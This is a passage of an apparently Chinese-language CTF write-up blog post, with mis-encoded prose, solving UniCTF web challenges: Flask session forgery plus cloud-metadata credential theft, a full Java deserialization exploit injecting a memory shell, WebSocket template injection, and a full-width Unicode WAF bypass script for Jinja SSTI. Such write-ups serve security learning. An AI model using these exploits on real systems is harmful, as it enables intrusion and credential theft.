<p>è·ŸJWTä¸€æ ·ï¼Œflask sessionä¹Ÿæœ‰å¯†é’¥è¿›è¡Œç­¾åï¼Œç”¨è¿™ä¸ªå·¥å…·çˆ†ç ´ä¸€ä¸‹</p>
<p><img src="/img/post/image-20260128125230805.png" alt="image-20260128125230805"></p>
<p>è·å¾—å¯†é’¥<code>dev-secret</code>ï¼Œæ¨æµ‹<code>user_id</code>ä¸º1æ˜¯ç®¡ç†å‘˜è´¦æˆ·ï¼Œä¾æ­¤æ„å»ºç®¡ç†å‘˜token</p>
<p><img src="/img/post/image-20260128125312025.png" alt="image-20260128125312025"></p>
<p>å†æ¬¡ç™»å½•ï¼Œç”¨æˆ·åå˜ä¸ºrootï¼Œtasksé¡µé¢å¤šäº†ä¸€æ¡éšè—è®°å½•<code>Legacy metadata check</code></p>
<p><img src="/img/post/image-20260128125541049.png" alt="image-20260128125541049"></p>
<p>æš´éœ²äº†å…ƒæ•°æ®æœåŠ¡åœ°å€<code>http://metadata:1338/</code>ï¼ŒAWSå…ƒæ•°æ®ç«¯ç‚¹<code>/latest/meta-data/iam/security-credentials/</code>ï¼ŒIAMè§’è‰²å<code>clouddiag-instance-role</code></p>
<p>è®¿é—®<code>http://metadata:1338/latest/meta-data/iam/security-credentials/clouddiag-instance-role</code>è·å–ä¸´æ—¶å‡­è¯</p>
<p><img src="/img/post/image-20260128125920606.png" alt="image-20260128125920606"></p>
<p>åˆ†åˆ«å¡«å…¥<code>/explorer</code>çš„è¡¨å•ä¸­ï¼Œçœ‹åˆ°äº†Buketsï¼Œå»è·å–<code>clouddiag-secrets</code></p>
<p><img src="/img/post/image-20260128130055909.png" alt="image-20260128130055909"></p>
<p>æœ‰flagæ–‡ä»¶ï¼ŒPrefixå¡«<code>flags/runtime/</code>ï¼ŒObject Keyå¡«<code>flag-a721f6e652364e498d102955c66b4efe.txt</code></p>
<p><img src="/img/post/image-20260128130044221.png" alt="image-20260128130044221"></p>
<p>è·å–flag</p>
<p><img src="/img/post/image-20260128130233596.png" alt="image-20260128130233596"></p>
<br/>

<h2 id="ez-Java"><a href="#ez-Java" class="headerlink" title="ez Java"></a>ez Java</h2><p>é¢˜ç›®ç»™äº†æºç ï¼Œæœ‰ç”¨çš„ç±»æ˜¯<code>ConfigDataWrapper</code>ï¼Œè¯¥ç±»çš„<code>toString()</code>æ–¹æ³•é‡Œé¢æœ‰åŠ¨æ€ç±»åŠ è½½çš„é€»è¾‘ï¼Œæœ‰ä¸ªå‰ææ˜¯<code>sign</code>å­—æ®µçš„å€¼ä¸ºå­—ç¬¦ä¸²<code>ready</code>æ‰èƒ½è§¦å‘</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        result.append(<span class="string">&quot;ConfigDataWrapper[&quot;</span>).append(<span class="string">&quot;ID=&quot;</span>).append(<span class="built_in">this</span>.configId == <span class="literal">null</span> ? <span class="string">&quot;DEFAULT&quot;</span> : <span class="built_in">this</span>.configId).append(<span class="string">&quot;, MetaSize=&quot;</span>).append(<span class="built_in">this</span>.metadata == <span class="literal">null</span> ? <span class="number">0</span> : <span class="built_in">this</span>.metadata.size()).append(<span class="string">&quot;]&quot;</span>);</span><br><span class="line">    	<span class="comment">//è¦æ±‚`sign`å­—æ®µçš„å€¼ä¸º`ready`</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.ClassByte != <span class="literal">null</span> &amp;&amp; <span class="string">&quot;ready&quot;</span>.equals(<span class="built_in">this</span>.sign)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">byte</span>[] decrypted = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="built_in">this</span>.ClassByte.length];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.ClassByte.length; ++i) &#123;</span><br><span class="line">                    decrypted[i] = (<span class="type">byte</span>)(<span class="built_in">this</span>.ClassByte[i] ^ <span class="number">255</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                <span class="type">String</span> <span class="variable">hex</span> <span class="operator">=</span> <span class="string">&quot;646566696e65436c617373&quot;</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; hex.length(); i += <span class="number">2</span>) &#123;</span><br><span class="line">                    sb.append((<span class="type">char</span>)Integer.parseInt(hex.substring(i, i + <span class="number">2</span>), <span class="number">16</span>));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">ClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(sb.toString(), String.class, <span class="type">byte</span>[].class, Integer.TYPE, Integer.TYPE);</span><br><span class="line">                m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                Class&lt;?&gt; clazz = (Class)m.invoke(loader, <span class="literal">null</span>, decrypted, <span class="number">0</span>, decrypted.length);</span><br><span class="line">                clazz.getConstructor().newInstance();</span><br><span class="line">                <span class="keyword">return</span> result.append(<span class="string">&quot; [Verified Context Loaded]&quot;</span>).toString();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var8) &#123;</span><br><span class="line">                <span class="keyword">return</span> result.append(<span class="string">&quot; [Verification Failed]&quot;</span>).toString();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> result.append(<span class="string">&quot; [Status: STANDBY]&quot;</span>).toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„<code>sb</code>æœ€åå…¶å®å°±æ˜¯<code>defieClass</code></p>
<p><img src="/img/post/image-20260131000616200.png" alt="image-20260131000616200"></p>
<p><code>readObject()</code>æ–¹æ³•åœ¨<code>UserProfileController</code>ç±»ä¸‹ï¼Œ<code>/api/user/settings/import</code>è·¯ç”±æ¥æ”¶ä¸€ä¸ª<code>configData</code>å‚æ•°ï¼Œå†…å®¹å¯ä»¥æ˜¯Base64å­—ç¬¦</p>
<p>åˆæœ‰ä¸ªæ¡ä»¶ï¼Œå¯¹è¾“å…¥æµè¯»å–å­—ç¬¦ä¸²éœ€è¦å†…å®¹ä¸º<code>InternalManager</code>ï¼Œè¯»å–æ•´å‹éœ€è¦å€¼ä¸º<code>2025</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&#123;&quot;/api/user&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserProfileController</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LoggerFactory.getLogger(UserProfileController.class);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&#123;&quot;/settings/import&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">importSettings</span><span class="params">(<span class="meta">@RequestParam(name = &quot;configData&quot;)</span> String configData)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] rawData = Tools.base64Decode(configData);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(rawData));</span><br><span class="line">            <span class="type">String</span> <span class="variable">identity</span> <span class="operator">=</span> ois.readUTF();</span><br><span class="line">            <span class="type">int</span> <span class="variable">version</span> <span class="operator">=</span> ois.readInt();</span><br><span class="line">            <span class="comment">//åˆä¸€ä¸ªåˆ¤æ–­æ¡ä»¶</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;InternalManager&quot;</span>.equals(identity) &amp;&amp; version == <span class="number">2025</span>) &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">                logger.info(<span class="string">&quot;Config Sync Status: Object [&#123;&#125;] has been integrated into system context.&quot;</span>, obj);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;SUCCESS: Configuration synchronized at internal level.&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;FAILED: Identity verification failed.&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;ERROR: Malformed configuration stream.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¤§è‡´çš„æ–¹æ³•æ¢³ç†å®Œäº†ï¼Œç°åœ¨çŸ¥é“æ ¸å¿ƒæ˜¯è§¦å‘<code>ConfigDataWrapper.toString()</code>åŠ è½½æ¶æ„ç±»ï¼Œé‚£å°±éœ€è¦åœ¨ååºåˆ—åŒ–æ—¶èƒ½å¤Ÿè‡ªåŠ¨è§¦å‘åˆ°å®ƒã€‚å…¶å®å¯ä»¥æƒ³åˆ°CC5ä¸­çš„å…¥å£<code>BadAttributeValueExpException.readObject()</code>è°ƒç”¨äº†å…¶<code>val</code>å­—æ®µçš„<code>toString()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">            val = <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            val= valObj;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span></span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">                || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">            val = valObj.toString();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">            val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆå…¥å£ç±»çš„æ„å»ºæµç¨‹å°±å’ŒCC5ä¸€è‡´äº†ï¼Œåªè¦è®©<code>val</code>çš„å€¼ä¸º<code>ConfigDataWrapper</code>å®ä¾‹å°±è¡Œ</p>
<p>æˆ‘ä»¬è¯•ç€åœ¨ç±»åŠ è½½çš„æ—¶å€™åŠ¨æ€æ³¨å…¥Filterå†…å­˜é©¬ï¼Œè¯¥ç±»çš„é™æ€ä»£ç å—æ‰§è¡Œæ—¶å®ä¾‹åŒ–ä¸€ä¸ªæ¶æ„Filterå¹¶æ‰§è¡Œæ³¨å†Œæµç¨‹ï¼Œæ¶æ„è¢«åŠ è½½ç±»çš„æ„å»ºå’ŒSpringBootæ³¨å…¥Filterå†…å­˜é©¬çš„æµç¨‹å¯ä»¥çœ‹<a href="https://leyi.live/2026/01/20/%E6%95%A3%E9%A2%981-20/">æ•£é¢˜1.20</a>çš„æœ€åä¸€éƒ¨åˆ†</p>
<p>å‰é¢<code>ConfigDataWrapper</code>å¯¹å­—èŠ‚æ•°ç»„è¿›è¡Œäº†ä¸€æ¬¡å¼‚æˆ–ï¼Œæˆ‘ä»¬å†å¼‚æˆ–ä¸€æ¬¡å°±æ˜¯åŸå­—èŠ‚æ•°ç»„äº†</p>
<p>æ ¹æ®å‰é¢çš„åˆ†ææ„å»ºExp</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unictf.ctf.tools.ConfigDataWrapper;</span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\leyi\\IntelliJTest\\serialize\\UniJava\\target\\classes\\InjectClass.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] encrypted = <span class="keyword">new</span> <span class="title class_">byte</span>[bytes.length];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; bytes.length; ++i) &#123;</span><br><span class="line">            encrypted[i] = (<span class="type">byte</span>)(bytes[i] ^ <span class="number">255</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ConfigDataWrapper</span> <span class="variable">configDataWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConfigDataWrapper</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">sign</span> <span class="operator">=</span> configDataWrapper.getClass().getDeclaredField(<span class="string">&quot;sign&quot;</span>);</span><br><span class="line">        sign.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        sign.set(configDataWrapper, <span class="string">&quot;ready&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">classByte</span> <span class="operator">=</span> configDataWrapper.getClass().getDeclaredField(<span class="string">&quot;ClassByte&quot;</span>);</span><br><span class="line">        classByte.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        classByte.set(configDataWrapper, encrypted);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> badAttributeValueExpException.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException, configDataWrapper);</span><br><span class="line"></span><br><span class="line">        serialize(badAttributeValueExpException);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;uniCTF.ser&quot;</span>)));</span><br><span class="line">        oos.writeUTF(<span class="string">&quot;InternalManager&quot;</span>);</span><br><span class="line">        oos.writeInt(<span class="number">2025</span>);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;uniCTF.ser&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(<span class="string">&quot;uniCTF.ser&quot;</span>)));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¾€<code>/api/user/settings/import</code>è·¯ç”±æ³¨å…¥Base64æ•°æ®ï¼Œæ˜¾ç¤ºæˆåŠŸ</p>
<p><img src="/img/post/image-20260129132830831.png" alt="image-20260129132830831"></p>
<p>flagåœ¨ç¯å¢ƒå˜é‡ä¸­</p>
<p><img src="/img/post/33e3ce3ff96044db2f60b7e209fd1ac0.png" alt="33e3ce3ff96044db2f60b7e209fd1ac0"></p>
<br/>

<h2 id="Intrasight"><a href="#Intrasight" class="headerlink" title="Intrasight"></a>Intrasight</h2><p>è¿™é¢˜æ˜¯é˜Ÿå‹å†™çš„ï¼Œè¿™é‡Œæˆ‘å°è¯•å¤ç°</p>
<p>8001ç«¯å£å¼€äº†ç®¡ç†å‘˜æœåŠ¡ï¼Œè¯¥ç«¯å£ä¸‹<code>/redirect_ws</code>ä¼šæä¾›ä¸€æ¬¡æ€§çš„tokenï¼Œå¹¶å°†æˆ‘ä»¬å¼•å¯¼è¿›9000ç«¯å£</p>
<p><img src="/img/post/image-20260131002959413.png" alt="image-20260131002959413"></p>
<p>ä½¿ç”¨tokenä¸9000ç«¯å£è¿›è¡Œwsè¿æ¥çš„å»ºç«‹ï¼Œæ˜¾ç¤ºå¤±è´¥</p>
<p><img src="/img/post/image-20260131003327218.png" alt="image-20260131003327218"></p>
<p>ç¼ºå°‘å¿…è¦è¯·æ±‚å¤´<code>X-Internal-Token</code>å’Œ<code>origin</code>ï¼Œè¡¥ä¸Šåè¿æ¥æˆåŠŸ</p>
<p><img src="/img/post/image-20260131003848789.png" alt="image-20260131003848789"></p>
<p>æµ‹è¯•å¾—åˆ°templateå­—æ®µå­˜åœ¨æ¨¡æ¿æ³¨å…¥</p>
<p><img src="/img/post/image-20260131004600147.png" alt="image-20260131004600147"></p>
<p>ä¿®æ”¹payloadè·å–flag</p>
<p><img src="/img/post/image-20260131004636635.png" alt="image-20260131004636635"></p>
<br/>

<h2 id="GlyphWeaver"><a href="#GlyphWeaver" class="headerlink" title="GlyphWeaver"></a>GlyphWeaver</h2><p>ä¾æ—§æ˜¯é˜Ÿå‹åšå‡ºæ¥çš„ï¼Œæ­¤å¤„ä¸ºå¤ç°</p>
<p>æœ‰ä¸€ä¸ªå¯ä»¥æŠŠä¸åŒæ ·å¼å¯¼å‡ºä¸ºå“ˆå¸Œçš„æ¥å£ï¼Œè¿™é‡Œå¯¹æ¨¡æ¿æ³¨å…¥åšäº†åŸºç¡€çš„WAF</p>
<p><img src="/img/post/image-20260131005440769.png" alt="image-20260131005440769"></p>
<p>è¿™é‡Œéœ€è¦ä½¿ç”¨<strong>å…¨è§’å­—ç¬¦ç»•è¿‡</strong>ï¼Œåˆç§°Unicode æ ‡å‡†åŒ– (NFKC) æ¼æ´ã€‚åœ¨ Python çš„ Web ç¯å¢ƒä¸­ï¼Œä¸ºäº†å¤„ç†å…¨çƒå„åœ°çš„å­—ç¬¦è¾“å…¥ï¼Œåç«¯å¸¸ä½¿ç”¨ <code>unicodedata.normalize(&#39;NFKC&#39;, input)</code> æ¥ç»Ÿä¸€å­—ç¬¦æ ¼å¼ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°†å­—ç¬¦å˜æˆå…¨è§’çš„ä»è€Œç»•è¿‡WAFï¼Œå› ä¸ºé¢˜ç›®æç¤ºè¯´æ”¯æŒå¤šç§å­—ä½“ï¼Œæ¨æµ‹æ ¡éªŒæ˜¯åœ¨è½¬æ¢æˆæ ‡å‡†æ ¼å¼ä¹‹å‰</p>
<p>å­—ç¬¦è½¬æ¢çš„è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">to_full_width</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;å°†åŠè§’å­—ç¬¦è½¬æ¢ä¸ºå…¨è§’å­—ç¬¦&quot;&quot;&quot;</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">        code = <span class="built_in">ord</span>(char)</span><br><span class="line">        <span class="comment"># å¤„ç†åŸºæœ¬æ‹‰ä¸å­—æ¯å’Œæ•°å­—</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">33</span> &lt;= code &lt;= <span class="number">126</span>:  <span class="comment"># å¯æ‰“å°ASCIIå­—ç¬¦ï¼ˆä¸åŒ…æ‹¬ç©ºæ ¼ï¼‰</span></span><br><span class="line">            result.append(<span class="built_in">chr</span>(code + <span class="number">0xFEE0</span>))</span><br><span class="line">        <span class="keyword">elif</span> char == <span class="string">&#x27; &#x27;</span>:  <span class="comment"># åŠè§’ç©ºæ ¼è½¬å…¨è§’ç©ºæ ¼</span></span><br><span class="line">            result.append(<span class="string">&#x27;ã€€&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result.append(char)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(result)</span><br><span class="line"></span><br><span class="line">test_text = <span class="string">&quot;&#123;&#123;lipsum.__globals__.__builtins__.open(&#x27;/flag&#x27;).read()&#125;&#125;&quot;</span></span><br><span class="line">full_width_text = to_full_width(test_text)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;åŸæ–‡æœ¬:&quot;</span>, test_text)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;å…¨è§’æ–‡æœ¬:&quot;</span>, full_width_text)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;é•¿åº¦å¯¹æ¯”:&quot;</span>, <span class="built_in">len</span>(test_text), <span class="string">&quot;â†’&quot;</span>, <span class="built_in">len</span>(full_width_text))</span><br></pre></td></tr></table></figure>

<p>ç»•è¿‡æˆåŠŸï¼Œè·å–flag</p>
<p><img src="/img/post/image-20260131120107585.png" alt="image-20260131120107585"></p>
<p>å…¶ä»–é¢˜ç›®å°±ç­‰å®˜æ–¹çš„WPäº†ï¼Œæˆ‘ä¹Ÿåœ¨ç­‰</p>
<br/>
</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Java/">Java</a><a class="post-meta__tags" href="/tags/XML/">XML</a><a class="post-meta__tags" href="/tags/python/">python</a></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/01/28/CommonsBeanutils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/" title="CommonsBeanutilsååºåˆ—åŒ–é“¾"><img class="cover" src="/img/post25.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">CommonsBeanutilsååºåˆ—åŒ–é“¾</div></div><div class="info-2"><div class="info-item-1">ccb</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">æ¥½ä¾</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">33</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/lenonline2021-source"><i class="fab fa-github"></i><span>Github</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#UniCTF-Web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text">UniCTF Webéƒ¨åˆ†é¢˜è§£</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SecureDoc"><span class="toc-number">1.1.</span> <span class="toc-text">SecureDoc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezUpload"><span class="toc-number">1.2.</span> <span class="toc-text">ezUpload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezUpload-Revenge"><span class="toc-number">1.3.</span> <span class="toc-text">ezUpload Revenge!!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CloudDiag"><span class="toc-number">1.4.</span> <span class="toc-text">CloudDiag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-Java"><span class="toc-number">1.5.</span> <span class="toc-text">ez Java</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Intrasight"><span class="toc-number">1.6.</span> <span class="toc-text">Intrasight</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GlyphWeaver"><span class="toc-number">1.7.</span> <span class="toc-text">GlyphWeaver</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/01/31/UniCTF-Web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" title="UniCTF Webéƒ¨åˆ†é¢˜è§£"><img src="/img/post26.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="UniCTF Webéƒ¨åˆ†é¢˜è§£"/></a><div class="content"><a class="title" href="/2026/01/31/UniCTF-Web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" title="UniCTF Webéƒ¨åˆ†é¢˜è§£">UniCTF Webéƒ¨åˆ†é¢˜è§£</a><time datetime="2026-01-31T04:02:50.000Z" title="Created 2026-01-31 12:02:50">2026-01-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/28/CommonsBeanutils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/" title="CommonsBeanutilsååºåˆ—åŒ–é“¾"><img src="/img/post25.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CommonsBeanutilsååºåˆ—åŒ–é“¾"/></a><div class="content"><a class="title" href="/2026/01/28/CommonsBeanutils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/" title="CommonsBeanutilsååºåˆ—åŒ–é“¾">CommonsBeanutilsååºåˆ—åŒ–é“¾</a><time datetime="2026-01-28T10:07:21.000Z" title="Created 2026-01-28 18:07:21">2026-01-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/21/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" title="æ­£åˆ™è¡¨è¾¾å¼"><img src="/img/post24.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="æ­£åˆ™è¡¨è¾¾å¼"/></a><div class="content"><a class="title" href="/2026/01/21/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" title="æ­£åˆ™è¡¨è¾¾å¼">æ­£åˆ™è¡¨è¾¾å¼</a><time datetime="2026-01-21T13:56:25.000Z" title="Created 2026-01-21 21:56:25">2026-01-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/20/%E6%95%A3%E9%A2%981-20/" title="æ•£é¢˜1.20"><img src="/img/post23.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="æ•£é¢˜1.20"/></a><div class="content"><a class="title" href="/2026/01/20/%E6%95%A3%E9%A2%981-20/" title="æ•£é¢˜1.20">æ•£é¢˜1.20</a><time datetime="2026-01-20T07:49:15.000Z" title="Created 2026-01-20 15:49:15">2026-01-20</time></div></div><div 